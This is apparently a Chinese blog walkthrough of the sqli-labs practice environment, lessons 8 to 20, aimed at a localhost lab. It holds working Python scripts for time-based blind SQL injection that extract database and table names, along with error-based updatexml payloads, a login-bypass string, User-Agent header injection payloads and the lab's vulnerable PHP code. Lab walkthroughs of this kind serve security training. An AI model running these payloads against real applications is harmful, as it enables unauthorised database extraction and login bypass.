<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_inject</span>(<span class="params">url, loc, mid, comp=<span class="string">&#x27;&gt;&#x27;</span>, target=<span class="string">&#x27;database()&#x27;</span></span>):</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: <span class="string">f&quot;1&#x27; and if(ascii(substr(<span class="subst">&#123;target&#125;</span>,<span class="subst">&#123;loc&#125;</span>,1))<span class="subst">&#123;comp&#125;</span><span class="subst">&#123;mid&#125;</span>, sleep(0.05),0); -- &quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    time_start = time.time()</span><br><span class="line">    req = requests.get(url=url, params=params)</span><br><span class="line">    time_end = time.time()</span><br><span class="line">    <span class="keyword">if</span> time_end - time_start &gt; <span class="number">0.03</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost/Less-8/&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">end = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> blind_inject(url, i, mid):</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check end</span></span><br><span class="line">        <span class="keyword">if</span> l &gt;= r:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> blind_inject(url, i, l, <span class="string">&#x27;=&#x27;</span>):</span><br><span class="line">                end = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> end:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += <span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>s<br>se<br>sec<br>secu<br>secur<br>securi<br>securit<br>security</p>
</blockquote>
<p>默认是爆databse()，修改<code>target</code>参数可以爆其他</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_inject</span>(<span class="params">url, loc, mid, comp=<span class="string">&#x27;&gt;&#x27;</span>, target=<span class="string">&#x27;database()&#x27;</span></span>):</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: <span class="string">f&quot;1&#x27; and if(ascii(substr(<span class="subst">&#123;target&#125;</span>,<span class="subst">&#123;loc&#125;</span>,1))<span class="subst">&#123;comp&#125;</span><span class="subst">&#123;mid&#125;</span>, sleep(0.05),0); -- &quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    time_start = time.time()</span><br><span class="line">    req = requests.get(url=url, params=params)</span><br><span class="line">    time_end = time.time()</span><br><span class="line">    <span class="keyword">if</span> time_end - time_start &gt; <span class="number">0.03</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost/Less-8/&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">end = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> blind_inject(</span><br><span class="line">                url,</span><br><span class="line">                i,</span><br><span class="line">                mid,</span><br><span class="line">                target=<span class="string">&quot;(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)&quot;</span></span><br><span class="line">        ):</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check end</span></span><br><span class="line">        <span class="keyword">if</span> l &gt;= r:</span><br><span class="line">            target = <span class="string">&quot;(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> blind_inject(url, i, l, <span class="string">&#x27;=&#x27;</span>, target=target):</span><br><span class="line">                end = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> end:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += <span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>e<br>em<br>ema<br>emai<br>email<br>emails<br>emails,<br>emails,r<br>emails,re<br>emails,ref<br>emails,refe<br>emails,refer<br>emails,refere<br>emails,referer<br>emails,referers<br>emails,referers,<br>emails,referers,u<br>emails,referers,ua<br>emails,referers,uag<br>emails,referers,uage<br>emails,referers,uagen<br>emails,referers,uagent<br>emails,referers,uagents<br>emails,referers,uagents,<br>emails,referers,uagents,u<br>emails,referers,uagents,us<br>emails,referers,uagents,use<br>emails,referers,uagents,user<br>emails,referers,uagents,users</p>
</blockquote>
<h3 id="09-Blind-Time-based-Single-Quotes"><a href="#09-Blind-Time-based-Single-Quotes" class="headerlink" title="09-Blind-Time based-Single Quotes"></a>09-Blind-Time based-Single Quotes</h3><p>同上</p>
<h3 id="10-Blind-Time-based-Double-Quotes"><a href="#10-Blind-Time-based-Double-Quotes" class="headerlink" title="10-Blind-Time based-Double Quotes"></a>10-Blind-Time based-Double Quotes</h3><h3 id="11-POST-Error-based"><a href="#11-POST-Error-based" class="headerlink" title="11-POST-Error based"></a>11-POST-Error based</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;$uname&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$passwd&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>paylod: <code>uname=admin&#39; and 1=1;--+&amp;passwd=</code></p>
<p>万能密码能过，后续爆数据就简单了</p>
<p><code>uname=admin&#39; order by 3;--+&amp;passwd=</code> &gt; <code>uname=admin&#39; order by 3;--+&amp;passwd=</code> 两个字段</p>
<p><code>uname=xxxxx&#39; union select database(),1;--+&amp;passwd=</code> &gt; 出库名 后续不继续演示</p>
<h3 id="12-Error-Based-Double-quotes"><a href="#12-Error-Based-Double-quotes" class="headerlink" title="12-Error Based-Double quotes"></a>12-Error Based-Double quotes</h3><p>paylod: <code>uname=admin&quot;) and 1=1;--+&amp;passwd=</code></p>
<p>闭合换一下 同上</p>
<h3 id="13-Double-Injection-String-with-twist"><a href="#13-Double-Injection-String-with-twist" class="headerlink" title="13-Double Injection- String- with twist"></a>13-Double Injection- String- with twist</h3><p>登陆成功无信息回显，使用<code>updataxml</code>进行报错注入</p>
<p><code>uname=admin&#39;) and updatexml(1,concat(0x0a,(select database())),1);--+&amp;passwd=123</code> &gt; 出库名 后续不做演示</p>
<h3 id="14-Double-Injection-Double-quotes-String"><a href="#14-Double-Injection-Double-quotes-String" class="headerlink" title="14-Double Injection- Double quotes- String"></a>14-Double Injection- Double quotes- String</h3><p>改一下闭合方式</p>
<p><code>unmae=admin&quot; and updatexml(1,concat(0x0a,(select database())),1);--+&amp;passwd=123</code></p>
<h3 id="15-Blind-Boolian-Based-String"><a href="#15-Blind-Boolian-Based-String" class="headerlink" title="15-Blind- Boolian Based- String"></a>15-Blind- Boolian Based- String</h3><p>修改一下盲注的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BLINE INJECT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_inject</span>(<span class="params">url, loc, mid, comp=<span class="string">&#x27;&gt;&#x27;</span>, target=<span class="string">&#x27;database()&#x27;</span></span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;uname&#x27;</span>: <span class="string">f&quot;admin&#x27; and if(ascii(substr(<span class="subst">&#123;target&#125;</span>,<span class="subst">&#123;loc&#125;</span>,1))<span class="subst">&#123;comp&#125;</span><span class="subst">&#123;mid&#125;</span>, sleep(0.02), 0); -- &quot;</span>,</span><br><span class="line">        <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    time_start = time.time()</span><br><span class="line">    req = requests.post(url=url, data=data)</span><br><span class="line">    time_end = time.time()</span><br><span class="line">    <span class="keyword">if</span> time_end - time_start &gt; <span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost/Less-15/&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">end = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        target = <span class="string">&quot;database()&quot;</span></span><br><span class="line">        <span class="keyword">if</span> blind_inject(url, i, mid, target=target):</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check end</span></span><br><span class="line">        <span class="keyword">if</span> l &gt;= r:</span><br><span class="line">            target = <span class="string">&quot;database()&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> blind_inject(url, i, l, <span class="string">&#x27;=&#x27;</span>, target=target):</span><br><span class="line">                end = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> end:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += <span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<p>修改target参数可以爆出其他数据 </p>
<p>例如<code>target = &quot;(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)&quot;</code></p>
<h3 id="16-Blind-Time-Based-Double-quotes-String"><a href="#16-Blind-Time-Based-Double-quotes-String" class="headerlink" title="16-Blind- Time Based- Double quotes- String"></a>16-Blind- Time Based- Double quotes- String</h3><p>改一下脚本中的闭合</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">f&quot;admin\&quot;) and if(ascii(substr(<span class="subst">&#123;target&#125;</span>,<span class="subst">&#123;loc&#125;</span>,1))<span class="subst">&#123;comp&#125;</span><span class="subst">&#123;mid&#125;</span>, sleep(0.02), 0); -- &quot;</span>,</span><br><span class="line">    <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="17-Update-Query-Error-based-String"><a href="#17-Update-Query-Error-based-String" class="headerlink" title="17-Update Query- Error based - String"></a>17-Update Query- Error based - String</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">	<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>, <span class="number">0</span>, <span class="number">15</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>()) &#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Quote if not a number</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>这次加了点过滤</strong></p>
<ol>
<li><p>如果不空，先截取<code>uname</code>的前15个字符</p>
</li>
<li><p>如果 <a target="_blank" rel="noopener" href="https://php.golaravel.com/info.configuration.html#ini.magic-quotes-gpc">magic_quotes_gpc</a> 配置打开了，<code>stripslashes</code>删除反斜杠</p>
</li>
<li><p><code>ctype_digit</code>检查字符是不是都是数字。如果不是，<code>mysql_real_escape_string()</code> 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
<p>下列字符受影响：</p>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>‘</li>
<li>“</li>
<li>\x1a</li>
</ul>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
<p>如果都是数字，则正常转数字</p>
</li>
</ol>
<p><strong>此外 这是个改密码逻辑的页面</strong></p>
<p>但是发现他只check了uname</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">	<span class="comment">//过滤uname</span></span><br><span class="line">	<span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">	<span class="variable">$passwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span></span><br><span class="line">	<span class="comment">//记录passwd和uname</span></span><br><span class="line">	<span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;User Name:&#x27;</span> . <span class="variable">$uname</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;New Password:&#x27;</span> . <span class="variable">$passwd</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span></span><br><span class="line">	//数据库链接	</span><br><span class="line">	@<span class="variable">$sql</span> = <span class="string">&quot;SELECT username, password FROM users WHEusername= <span class="subst">$uname</span> LIMIT 0,1</span></span><br><span class="line"><span class="string">	<span class="subst">$result</span> = mysql_query(<span class="subst">$sql</span>);</span></span><br><span class="line"><span class="string">	<span class="subst">$row</span> = mysql_fetch_array(<span class="subst">$result</span>);</span></span><br><span class="line"><span class="string">	//echo <span class="subst">$row</span>;</span></span><br><span class="line"><span class="string">	if (<span class="subst">$row</span>) &#123;</span></span><br><span class="line"><span class="string">		//echo &#x27;&lt;font color= &quot;</span>#<span class="number">0000</span>ff<span class="string">&quot;&gt;&#x27;;	</span></span><br><span class="line"><span class="string">		<span class="subst">$row1</span> = <span class="subst">$row</span>[&#x27;username&#x27;];</span></span><br><span class="line"><span class="string">		//echo &#x27;Your Login name:&#x27;. <span class="subst">$row1</span>;</span></span><br><span class="line"><span class="string">		<span class="subst">$update</span> = &quot;</span>UPDATE users SET password = <span class="string">&#x27;$passwWHERE username=&#x27;</span><span class="variable">$row1</span><span class="string">&#x27;&quot;;</span></span><br><span class="line"><span class="string">		mysql_query($update);</span></span><br><span class="line"><span class="string">		echo &quot;&lt;br&gt;</span></span><br><span class="line"><span class="string">		if (mysql_error()) &#123;</span></span><br><span class="line"><span class="string">			echo &#x27;</span>&lt;font color= <span class="string">&quot;#FFFF00&quot;</span> font size = <span class="number">3</span> &gt;<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">			print_r(mysql_error());</span></span><br><span class="line"><span class="string">			echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;;</span></span><br><span class="line"><span class="string">			echo &quot;&lt;/font&gt;&quot;;</span></span><br><span class="line"><span class="string">		&#125; else &#123;</span></span><br><span class="line"><span class="string">			echo &#x27;</span>&lt;font color= <span class="string">&quot;#FFFF00&quot;</span> font size = <span class="number">3</span> &gt;<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">			//echo &quot; You password has been successfulupdated &quot; ;		</span></span><br><span class="line"><span class="string">			echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">			echo &quot;&lt;/font&gt;&quot;;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">		echo &#x27;</span>&lt;img src=<span class="string">&quot;../images/flag1.jpg&quot;</span>   /&gt;<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">		//echo &#x27;</span>Your <span class="attr">Password</span>:<span class="string">&#x27; .$row[&#x27;</span>password<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">		echo &quot;&lt;/font&gt;&quot;;</span></span><br><span class="line"><span class="string">	&#125; else &#123;</span></span><br><span class="line"><span class="string">		echo &#x27;</span>&lt;font size=<span class="string">&quot;4.5&quot;</span> color=<span class="string">&quot;#FFFF00&quot;</span>&gt;<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">		//echo &quot;Bug off you Silly Dumb hacker&quot;;</span></span><br><span class="line"><span class="string">		echo &quot;&lt;/br&gt;&quot;;</span></span><br><span class="line"><span class="string">		echo &#x27;</span>&lt;img src=<span class="string">&quot;../images/slap1.jpg&quot;</span>   /&gt;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们提供一个存在的uname</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$update</span> = <span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>对于update语句，发现可以使用报错注入</p>
<p>paylod: <code>uname=admin&amp;passwd=admin&#39; and updatexml(1,concat(0x0a,database()),1); --+</code></p>
<p>其他同理</p>
<h3 id="18-Header-Injection-Error-Based-string"><a href="#18-Header-Injection-Error-Based-string" class="headerlink" title="18-Header Injection- Error Based- string"></a>18-Header Injection- Error Based- string</h3><p>这题给了个IP的回显，并且对uname和passwd都做了过滤，如果成功登入还会显示你的uagents</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .<span class="variable">$IP</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row1</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row1</span>) &#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>);</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .<span class="variable">$uagent</span>;</span><br><span class="line">	...</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());			</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现<code>uname</code>和<code>passwd</code>不好注，但<code>uagent</code>是完全没有过滤的</p>
<p>User-Agent: <code>1&#39;,1,updatexml(1,concat(0x0a,database()),1));-- &#39;</code></p>
<p><strong>注意 sql语句中的反引号 `,会影响<code>--+</code>的注释，所以可以使用<code>#(%23)</code>或者使用<code>--+&#39;</code>把后面单引号或者反引号闭合</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `security`.`uagents` (`uagent`, `ip_address`, `username`) <span class="keyword">VALUES</span> (<span class="string">&#x27;1&#x27;</span>,<span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="number">0x0a</span>,database()),<span class="number">1</span>));<span class="comment">-- &#x27;`, &#x27;$IP&#x27;, $uname)</span></span><br></pre></td></tr></table></figure>

<p>User-Agent: <code>1&#39;,1,updatexml(1,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),1));-- &#39;</code></p>
<h3 id="19-Header-Injection-Referer-Error-Based-string"><a href="#19-Header-Injection-Referer-Error-Based-string" class="headerlink" title="19-Header Injection- Referer- Error Based- string"></a>19-Header Injection- Referer- Error Based- string</h3><p>这次把uagent换成了referer, paylod同上</p>
<h3 id="20-Cookie-Injection-Error-Based-string"><a href="#20-Cookie-Injection-Error-Based-string" class="headerlink" title="20-Cookie Injection- Error Based- string"></a>20-Cookie Injection- Error Based- string</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);	</span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>有这么一句话，将uname设为cookie，然后重定向至首页，</p>
